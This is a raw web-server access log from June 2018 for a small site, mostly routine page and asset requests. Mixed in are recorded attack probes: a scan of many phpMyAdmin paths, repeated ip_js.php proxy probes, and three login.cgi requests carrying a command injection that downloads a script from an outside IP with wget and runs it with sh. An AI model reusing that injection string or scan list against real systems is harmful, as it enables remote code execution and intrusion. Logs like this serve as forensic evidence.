103.238.224.97 - - [18/Jun/2018:01:49:44 +0000] "POST /db.init.php HTTP/1.1" 404 178 "-" "Mozilla/5.0"
103.238.224.97 - - [18/Jun/2018:01:49:49 +0000] "POST /db_session.init.php HTTP/1.1" 404 178 "-" "Mozilla/5.0"
103.238.224.97 - - [18/Jun/2018:01:49:57 +0000] "POST /sheep.php HTTP/1.1" 404 178 "-" "Mozilla/5.0"
103.238.224.97 - - [18/Jun/2018:01:49:57 +0000] "GET /index.php HTTP/1.1" 200 7885 "-" "Mozilla/5.0"
103.238.224.97 - - [18/Jun/2018:01:50:00 +0000] "GET /index.php HTTP/1.1" 200 7885 "-" "Mozilla/5.0"
103.238.224.97 - - [18/Jun/2018:01:50:00 +0000] "GET /phpmyadmin/index.php HTTP/1.1" 404 178 "-" "Mozilla/5.0"
103.238.224.97 - - [18/Jun/2018:01:50:00 +0000] "GET /phpMyAdmin/index.php HTTP/1.1" 404 178 "-" "Mozilla/5.0"
103.238.224.97 - - [18/Jun/2018:01:50:00 +0000] "GET /pmd/index.php HTTP/1.1" 404 178 "-" "Mozilla/5.0"
103.238.224.97 - - [18/Jun/2018:01:50:01 +0000] "GET /pma/index.php HTTP/1.1" 404 178 "-" "Mozilla/5.0"
103.238.224.97 - - [18/Jun/2018:01:50:01 +0000] "GET /PMA/index.php HTTP/1.1" 404 178 "-" "Mozilla/5.0"
103.238.224.97 - - [18/Jun/2018:01:50:01 +0000] "GET /PMA2/index.php HTTP/1.1" 404 178 "-" "Mozilla/5.0"
103.238.224.97 - - [18/Jun/2018:01:50:01 +0000] "GET /pmamy/index.php HTTP/1.1" 404 178 "-" "Mozilla/5.0"
103.238.224.97 - - [18/Jun/2018:01:50:02 +0000] "GET /pmamy2/index.php HTTP/1.1" 404 178 "-" "Mozilla/5.0"
103.238.224.97 - - [18/Jun/2018:01:50:02 +0000] "GET /mysql/index.php HTTP/1.1" 404 178 "-" "Mozilla/5.0"
103.238.224.97 - - [18/Jun/2018:01:50:02 +0000] "GET /admin/index.php HTTP/1.1" 404 178 "-" "Mozilla/5.0"
103.238.224.97 - - [18/Jun/2018:01:50:02 +0000] "GET /db/index.php HTTP/1.1" 404 178 "-" "Mozilla/5.0"
103.238.224.97 - - [18/Jun/2018:01:50:02 +0000] "GET /dbadmin/index.php HTTP/1.1" 404 178 "-" "Mozilla/5.0"
103.238.224.97 - - [18/Jun/2018:01:50:03 +0000] "GET /web/phpMyAdmin/index.php HTTP/1.1" 404 178 "-" "Mozilla/5.0"
103.238.224.97 - - [18/Jun/2018:01:50:03 +0000] "GET /admin/pma/index.php HTTP/1.1" 404 178 "-" "Mozilla/5.0"
103.238.224.97 - - [18/Jun/2018:01:50:03 +0000] "GET /admin/PMA/index.php HTTP/1.1" 404 178 "-" "Mozilla/5.0"
103.238.224.97 - - [18/Jun/2018:01:50:03 +0000] "GET /admin/mysql/index.php HTTP/1.1" 404 178 "-" "Mozilla/5.0"
103.238.224.97 - - [18/Jun/2018:01:50:03 +0000] "GET /admin/mysql2/index.php HTTP/1.1" 404 178 "-" "Mozilla/5.0"
103.238.224.97 - - [18/Jun/2018:01:50:04 +0000] "GET /admin/phpmyadmin/index.php HTTP/1.1" 404 178 "-" "Mozilla/5.0"
103.238.224.97 - - [18/Jun/2018:01:50:04 +0000] "GET /admin/phpMyAdmin/index.php HTTP/1.1" 404 178 "-" "Mozilla/5.0"
103.238.224.97 - - [18/Jun/2018:01:50:04 +0000] "GET /admin/phpmyadmin2/index.php HTTP/1.1" 404 178 "-" "Mozilla/5.0"
103.238.224.97 - - [18/Jun/2018:01:50:04 +0000] "GET /mysqladmin/index.php HTTP/1.1" 404 178 "-" "Mozilla/5.0"
103.238.224.97 - - [18/Jun/2018:01:50:05 +0000] "GET /mysql-admin/index.php HTTP/1.1" 404 178 "-" "Mozilla/5.0"
103.238.224.97 - - [18/Jun/2018:01:50:05 +0000] "GET /phpadmin/index.php HTTP/1.1" 404 178 "-" "Mozilla/5.0"
103.238.224.97 - - [18/Jun/2018:01:50:05 +0000] "GET /phpmyadmin0/index.php HTTP/1.1" 404 178 "-" "Mozilla/5.0"
103.238.224.97 - - [18/Jun/2018:01:50:05 +0000] "GET /phpmyadmin1/index.php HTTP/1.1" 404 178 "-" "Mozilla/5.0"
103.238.224.97 - - [18/Jun/2018:01:50:05 +0000] "GET /phpmyadmin2/index.php HTTP/1.1" 404 178 "-" "Mozilla/5.0"
103.238.224.97 - - [18/Jun/2018:01:50:06 +0000] "GET /myadmin/index.php HTTP/1.1" 404 178 "-" "Mozilla/5.0"
103.238.224.97 - - [18/Jun/2018:01:50:06 +0000] "GET /myadmin2/index.php HTTP/1.1" 404 178 "-" "Mozilla/5.0"
103.238.224.97 - - [18/Jun/2018:01:50:06 +0000] "GET /xampp/phpmyadmin/index.php HTTP/1.1" 404 178 "-" "Mozilla/5.0"
103.238.224.97 - - [18/Jun/2018:01:50:06 +0000] "GET /phpMyadmin_bak/index.php HTTP/1.1" 404 178 "-" "Mozilla/5.0"
103.238.224.97 - - [18/Jun/2018:01:50:06 +0000] "GET /www/phpMyAdmin/index.php HTTP/1.1" 404 178 "-" "Mozilla/5.0"
103.238.224.97 - - [18/Jun/2018:01:50:07 +0000] "GET /tools/phpMyAdmin/index.php HTTP/1.1" 404 178 "-" "Mozilla/5.0"
103.238.224.97 - - [18/Jun/2018:01:50:07 +0000] "GET /phpmyadmin-old/index.php HTTP/1.1" 404 178 "-" "Mozilla/5.0"
103.238.224.97 - - [18/Jun/2018:01:50:08 +0000] "GET /phpMyAdminold/index.php HTTP/1.1" 404 178 "-" "Mozilla/5.0"
103.238.224.97 - - [18/Jun/2018:01:50:08 +0000] "GET /phpMyAdmin.old/index.php HTTP/1.1" 404 178 "-" "Mozilla/5.0"
103.238.224.97 - - [18/Jun/2018:01:50:08 +0000] "GET /pma-old/index.php HTTP/1.1" 404 178 "-" "Mozilla/5.0"
103.238.224.97 - - [18/Jun/2018:01:50:08 +0000] "GET /claroline/phpMyAdmin/index.php HTTP/1.1" 404 178 "-" "Mozilla/5.0"
103.238.224.97 - - [18/Jun/2018:01:50:09 +0000] "GET /typo3/phpmyadmin/index.php HTTP/1.1" 404 178 "-" "Mozilla/5.0"
103.238.224.97 - - [18/Jun/2018:01:50:09 +0000] "GET /phpma/index.php HTTP/1.1" 404 178 "-" "Mozilla/5.0"
103.238.224.97 - - [18/Jun/2018:01:50:09 +0000] "GET /phpmyadmin/phpmyadmin/index.php HTTP/1.1" 404 178 "-" "Mozilla/5.0"
103.238.224.97 - - [18/Jun/2018:01:50:09 +0000] "GET /phpMyAdmin/phpMyAdmin/index.php HTTP/1.1" 404 178 "-" "Mozilla/5.0"
94.232.17.21 - - [18/Jun/2018:01:59:26 +0000] "GET / HTTP/1.0" 200 7874 "-" "-"
88.249.58.30 - - [18/Jun/2018:02:07:17 +0000] "HEAD / HTTP/1.0" 200 0 "-" "-"
85.98.10.219 - - [18/Jun/2018:02:08:38 +0000] "GET / HTTP/1.0" 200 7874 "-" "-"
61.176.222.170 - - [18/Jun/2018:02:10:35 +0000] "GET /ip_js.php?IP=195.201.186.116&DK=80&DD=ASNIAOUFMOMZJIBD HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.92 Safari/537.1 LBBROWSER"
61.176.222.170 - - [18/Jun/2018:02:34:23 +0000] "GET /ip_js.php?IP=195.201.186.116&DK=80&DD=ASNIAOUFMOMZJIBD HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.92 Safari/537.1 LBBROWSER"
109.195.211.23 - - [18/Jun/2018:02:44:37 +0000] "GET / HTTP/1.1" 200 7887 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
61.176.222.171 - - [18/Jun/2018:02:53:02 +0000] "GET /ip_js.php?IP=195.201.186.116&DK=80&DD=NSNIAOUFMOMZJIBA HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.92 Safari/537.1 LBBROWSER"
85.186.101.160 - - [18/Jun/2018:02:55:12 +0000] "GET /login.cgi?cli=aa%20aa%27;wget%20http://185.62.190.191/r%20-O%20-%3E%20/tmp/r;sh%20/tmp/r%27$ HTTP/1.1" 404 152 "-" "Hello, World"
61.176.222.170 - - [18/Jun/2018:03:04:34 +0000] "GET /ip_js.php?IP=195.201.186.116&DK=80&DD=ASNIAOUFMOMZJIBD HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.92 Safari/537.1 LBBROWSER"
173.69.26.66 - - [18/Jun/2018:03:13:22 +0000] "HEAD / HTTP/1.0" 200 0 "-" "Hello, World"
61.176.222.170 - - [18/Jun/2018:03:18:10 +0000] "GET /ip_js.php?IP=195.201.186.116&DK=80&DD=ASNIAOUFMOMZJIBD HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.92 Safari/537.1 LBBROWSER"
213.251.235.126 - - [18/Jun/2018:03:43:06 +0000] "GET / HTTP/1.0" 200 7874 "-" "-"
60.191.38.77 - - [18/Jun/2018:03:46:02 +0000] "GET / HTTP/1.1" 200 7887 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0"
103.246.43.109 - - [18/Jun/2018:03:52:39 +0000] "GET / HTTP/1.0" 200 7872 "-" "-"
220.89.48.190 - - [18/Jun/2018:03:56:33 +0000] "HEAD / HTTP/1.0" 200 0 "-" "-"
61.176.222.171 - - [18/Jun/2018:04:00:44 +0000] "GET /ip_js.php?IP=195.201.186.116&DK=80&DD=NSNIAOUFMOMZJIBA HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.92 Safari/537.1 LBBROWSER"
83.228.33.162 - - [18/Jun/2018:04:08:56 +0000] "GET / HTTP/1.0" 200 7874 "-" "-"
91.225.110.125 - - [18/Jun/2018:04:11:49 +0000] "GET / HTTP/1.1" 200 7887 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
61.176.222.170 - - [18/Jun/2018:04:15:00 +0000] "GET /ip_js.php?IP=195.201.186.116&DK=80&DD=ASNIAOUFMOMZJIBD HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.92 Safari/537.1 LBBROWSER"
79.132.126.175 - - [18/Jun/2018:04:22:51 +0000] "GET / HTTP/1.0" 200 7874 "-" "-"
61.176.222.171 - - [18/Jun/2018:04:26:57 +0000] "GET /ip_js.php?IP=195.201.186.116&DK=80&DD=NSNIAOUFMOMZJIBA HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.92 Safari/537.1 LBBROWSER"
185.187.2.5 - - [18/Jun/2018:04:27:00 +0000] "GET / HTTP/1.1" 200 7885 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
61.176.222.170 - - [18/Jun/2018:04:38:28 +0000] "GET /ip_js.php?IP=195.201.186.116&DK=80&DD=ASNIAOUFMOMZJIBD HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.92 Safari/537.1 LBBROWSER"
91.108.133.164 - - [18/Jun/2018:04:59:19 +0000] "GET / HTTP/1.1" 200 7887 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
210.100.135.111 - - [18/Jun/2018:05:06:02 +0000] "GET / HTTP/1.1" 200 7887 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
210.100.135.111 - - [18/Jun/2018:05:06:03 +0000] "HEAD / HTTP/1.0" 200 0 "-" "-"
61.176.222.171 - - [18/Jun/2018:05:07:27 +0000] "GET /ip_js.php?IP=195.201.186.116&DK=80&DD=NSNIAOUFMOMZJIBA HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.92 Safari/537.1 LBBROWSER"
175.206.95.73 - - [18/Jun/2018:05:08:36 +0000] "GET / HTTP/1.0" 499 0 "-" "-"
109.172.67.82 - - [18/Jun/2018:05:10:49 +0000] "GET / HTTP/1.0" 200 7874 "-" "-"
76.8.252.194 - - [18/Jun/2018:05:16:21 +0000] "GET / HTTP/1.0" 200 7874 "-" "-"
61.176.222.171 - - [18/Jun/2018:05:20:38 +0000] "GET /ip_js.php?IP=195.201.186.116&DK=80&DD=NSNIAOUFMOMZJIBA HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.92 Safari/537.1 LBBROWSER"
173.69.26.66 - - [18/Jun/2018:05:24:20 +0000] "HEAD / HTTP/1.0" 499 0 "-" "Hello, World"
31.220.82.96 - - [18/Jun/2018:05:26:25 +0000] "HEAD / HTTP/1.0" 200 0 "-" "-"
168.196.68.70 - - [18/Jun/2018:05:30:24 +0000] "HEAD / HTTP/1.0" 200 0 "-" "-"
61.176.222.170 - - [18/Jun/2018:05:48:28 +0000] "GET /ip_js.php?IP=195.201.186.116&DK=80&DD=ASNIAOUFMOMZJIBD HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.92 Safari/537.1 LBBROWSER"
191.54.117.35 - - [18/Jun/2018:05:50:40 +0000] "GET /login.cgi?cli=aa%20aa%27;wget%20http://185.62.190.191/r%20-O%20-%3E%20/tmp/r;sh%20/tmp/r%27$ HTTP/1.1" 404 152 "-" "Hello, World"
54.153.67.27 - - [18/Jun/2018:05:58:33 +0000] "GET / HTTP/1.1" 200 2333 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.102 Safari/537.36"
91.201.231.52 - - [18/Jun/2018:06:05:12 +0000] "HEAD / HTTP/1.0" 200 0 "-" "-"
61.176.222.171 - - [18/Jun/2018:06:13:39 +0000] "GET /ip_js.php?IP=195.201.186.116&DK=80&DD=NSNIAOUFMOMZJIBA HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.92 Safari/537.1 LBBROWSER"
61.176.222.170 - - [18/Jun/2018:06:26:29 +0000] "GET /ip_js.php?IP=195.201.186.116&DK=80&DD=ASNIAOUFMOMZJIBD HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.92 Safari/537.1 LBBROWSER"
80.232.167.51 - - [18/Jun/2018:06:37:25 +0000] "HEAD / HTTP/1.0" 200 0 "-" "-"
37.72.71.70 - - [18/Jun/2018:06:49:45 +0000] "GET / HTTP/1.0" 200 7874 "-" "-"
145.236.80.60 - - [18/Jun/2018:07:00:13 +0000] "GET / HTTP/1.0" 200 7874 "-" "-"
185.26.99.217 - - [18/Jun/2018:07:03:57 +0000] "GET /favicon.ico HTTP/1.1" 404 178 "-" "Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:52.0) Gecko/20100101 Firefox/52.0"
61.176.222.170 - - [18/Jun/2018:07:04:47 +0000] "GET /ip_js.php?IP=195.201.186.116&DK=80&DD=ASNIAOUFMOMZJIBD HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.92 Safari/537.1 LBBROWSER"
184.152.183.145 - - [18/Jun/2018:07:11:42 +0000] "GET / HTTP/1.0" 200 7874 "-" "-"
184.152.183.145 - - [18/Jun/2018:07:11:54 +0000] "GET / HTTP/1.0" 200 7874 "-" "-"
184.152.183.145 - - [18/Jun/2018:07:11:58 +0000] "GET / HTTP/1.0" 499 0 "-" "-"
184.152.183.145 - - [18/Jun/2018:07:12:22 +0000] "GET / HTTP/1.0" 499 0 "-" "-"
95.165.193.38 - - [18/Jun/2018:07:12:57 +0000] "GET / HTTP/1.0" 200 7874 "-" "-"
61.176.222.171 - - [18/Jun/2018:07:15:23 +0000] "GET /ip_js.php?IP=195.201.186.116&DK=80&DD=NSNIAOUFMOMZJIBA HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.92 Safari/537.1 LBBROWSER"
217.131.26.237 - - [18/Jun/2018:07:34:18 +0000] "GET / HTTP/1.0" 200 7874 "-" "-"
61.176.222.170 - - [18/Jun/2018:07:42:35 +0000] "GET /ip_js.php?IP=195.201.186.116&DK=80&DD=ASNIAOUFMOMZJIBD HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.92 Safari/537.1 LBBROWSER"
69.34.227.130 - - [18/Jun/2018:07:45:41 +0000] "GET / HTTP/1.0" 499 0 "-" "-"
89.252.57.183 - - [18/Jun/2018:07:46:15 +0000] "GET / HTTP/1.1" 200 2333 "-" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36"
89.252.57.183 - - [18/Jun/2018:07:46:15 +0000] "GET /img/top.png HTTP/1.1" 304 0 "http://docker.consultingpro.com.ua/" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36"
89.252.57.183 - - [18/Jun/2018:07:46:15 +0000] "GET /css/main.min.css HTTP/1.1" 304 0 "http://docker.consultingpro.com.ua/" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36"
89.252.57.183 - - [18/Jun/2018:07:46:15 +0000] "GET /img/icon5.png HTTP/1.1" 304 0 "http://docker.consultingpro.com.ua/" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36"
89.252.57.183 - - [18/Jun/2018:07:46:15 +0000] "GET /img/img3.png HTTP/1.1" 304 0 "http://docker.consultingpro.com.ua/" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36"
89.252.57.183 - - [18/Jun/2018:07:46:15 +0000] "GET /img/scroll.png HTTP/1.1" 304 0 "http://docker.consultingpro.com.ua/" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36"
89.252.57.183 - - [18/Jun/2018:07:46:15 +0000] "GET /img/big.png HTTP/1.1" 304 0 "http://docker.consultingpro.com.ua/" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36"
89.252.57.183 - - [18/Jun/2018:07:46:15 +0000] "GET /img/left.png HTTP/1.1" 304 0 "http://docker.consultingpro.com.ua/" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36"
89.252.57.183 - - [18/Jun/2018:07:46:16 +0000] "GET /img/img2.png HTTP/1.1" 304 0 "http://docker.consultingpro.com.ua/" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36"
89.252.57.183 - - [18/Jun/2018:07:46:16 +0000] "GET /img/icon3.jpg HTTP/1.1" 304 0 "http://docker.consultingpro.com.ua/" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36"
89.252.57.183 - - [18/Jun/2018:07:46:16 +0000] "GET /img/icon1.jpg HTTP/1.1" 304 0 "http://docker.consultingpro.com.ua/" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36"
89.252.57.183 - - [18/Jun/2018:07:46:16 +0000] "GET /img/icon4.png HTTP/1.1" 304 0 "http://docker.consultingpro.com.ua/" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36"
89.252.57.183 - - [18/Jun/2018:07:46:16 +0000] "GET /img/icon6.png HTTP/1.1" 304 0 "http://docker.consultingpro.com.ua/" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36"
89.252.57.183 - - [18/Jun/2018:07:46:16 +0000] "GET /img/icon2.jpg HTTP/1.1" 304 0 "http://docker.consultingpro.com.ua/" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36"
89.252.57.183 - - [18/Jun/2018:07:46:16 +0000] "GET /img/right.png HTTP/1.1" 304 0 "http://docker.consultingpro.com.ua/" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36"
89.252.57.183 - - [18/Jun/2018:07:46:16 +0000] "GET /img/img1.png HTTP/1.1" 304 0 "http://docker.consultingpro.com.ua/" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36"
89.252.57.183 - - [18/Jun/2018:07:46:16 +0000] "GET /js/main.min.js HTTP/1.1" 304 0 "http://docker.consultingpro.com.ua/" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36"
89.252.57.183 - - [18/Jun/2018:07:46:16 +0000] "GET /img/btn-bg.png HTTP/1.1" 304 0 "http://docker.consultingpro.com.ua/css/main.min.css" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36"
89.252.57.183 - - [18/Jun/2018:07:46:16 +0000] "GET /img/bg-t.jpg HTTP/1.1" 304 0 "http://docker.consultingpro.com.ua/css/main.min.css" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36"
89.252.57.183 - - [18/Jun/2018:07:46:16 +0000] "GET /img/bg-f.jpg HTTP/1.1" 304 0 "http://docker.consultingpro.com.ua/css/main.min.css" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36"
89.252.57.183 - - [18/Jun/2018:07:46:16 +0000] "GET /fonts/GothamPro/GothamPro-Light.woff2 HTTP/1.1" 304 0 "http://docker.consultingpro.com.ua/css/main.min.css" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36"
89.252.57.183 - - [18/Jun/2018:07:46:16 +0000] "GET /fonts/bebas/BebasNeueBook.woff2 HTTP/1.1" 304 0 "http://docker.consultingpro.com.ua/css/main.min.css" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36"
89.252.57.183 - - [18/Jun/2018:07:46:16 +0000] "GET /fonts/bebas/BebasNeueBold.woff2 HTTP/1.1" 304 0 "http://docker.consultingpro.com.ua/css/main.min.css" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36"
89.252.57.183 - - [18/Jun/2018:07:46:16 +0000] "GET /fonts/GothamPro/GothamPro-Bold.woff2 HTTP/1.1" 304 0 "http://docker.consultingpro.com.ua/css/main.min.css" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36"
89.252.57.183 - - [18/Jun/2018:07:46:16 +0000] "GET /img/mask.jpg HTTP/1.1" 304 0 "http://docker.consultingpro.com.ua/css/main.min.css" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36"
89.252.57.183 - - [18/Jun/2018:07:46:16 +0000] "GET /img/rocket.png HTTP/1.1" 304 0 "http://docker.consultingpro.com.ua/css/main.min.css" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36"
89.252.57.183 - - [18/Jun/2018:07:46:16 +0000] "GET /img/favicon.ico HTTP/1.1" 404 209 "http://docker.consultingpro.com.ua/" "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.167 Safari/537.36"
88.247.54.171 - - [18/Jun/2018:07:47:32 +0000] "GET / HTTP/1.0" 200 7874 "-" "-"
88.247.132.89 - - [18/Jun/2018:07:49:48 +0000] "GET /login.cgi?cli=aa%20aa%27;wget%20http://185.62.190.191/r%20-O%20-%3E%20/tmp/r;sh%20/tmp/r%27$ HTTP/1.1" 404 152 "-" "Hello, World"
61.176.222.171 - - [18/Jun/2018:07:57:57 +0000] "GET /ip_js.php?IP=195.201.186.116&DK=80&DD=NSNIAOUFMOMZJIBA HTTP/1.1" 404 580 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.92 Safari/537.1 LBBROWSER"
66.102.9.25 - - [18/Jun/2018:08:04:27 +0000] "GET / HTTP/1.1" 200 2333 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon"
66.102.9.19 - - [18/Jun/2018:08:04:27 +0000] "GET /img/favicon.ico HTTP/1.1" 404 209 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon"
66.102.9.25 - - [18/Jun/2018:08:04:27 +0000] "GET / HTTP/1.1" 200 2333 "http://www.google.com/search" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko; Google Web Preview) Chrome/41.0.2272.118 Safari/537.36"
66.102.9.25 - - [18/Jun/2018:08:04:27 +0000] "GET /img/img1.png HTTP/1.1" 200 842 "http://docker.consultingpro.com.ua/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko; Google Web Preview) Chrome/41.0.2272.118 Safari/537.36"
66.102.9.25 - - [18/Jun/2018:08:04:27 +0000] "GET /img/icon1.jpg HTTP/1.1" 200 41936 "http://docker.consultingpro.com.ua/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko; Google Web Preview) Chrome/41.0.2272.118 Safari/537.36"
66.102.9.25 - - [18/Jun/2018:08:04:27 +0000] "GET /img/icon5.png HTTP/1.1" 200 614 "http://docker.consultingpro.com.ua/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko; Google Web Preview) Chrome/41.0.2272.118 Safari/537.36"
66.102.9.23 - - [18/Jun/2018:08:04:27 +0000] "GET /img/icon4.png HTTP/1.1" 200 1332 "http://docker.consultingpro.com.ua/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko; Google Web Preview) Chrome/41.0.2272.118 Safari/537.36"
66.102.9.23 - - [18/Jun/2018:08:04:27 +0000] "GET /img/scroll.png HTTP/1.1" 200 488 "http://docker.consultingpro.com.ua/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko; Google Web Preview) Chrome/41.0.2272.118 Safari/537.36"
66.102.9.25 - - [18/Jun/2018:08:04:27 +0000] "GET /img/icon6.png HTTP/1.1" 200 1338 "http://docker.consultingpro.com.ua/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko; Google Web Preview) Chrome/41.0.2272.118 Safari/537.36"
66.102.9.19 - - [18/Jun/2018:08:04:27 +0000] "GET /img/img2.png HTTP/1.1" 200 16038 "http://docker.consultingpro.com.ua/" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko; Google Web Preview) Chrome/41.0.2272.118 Safari/537.36"
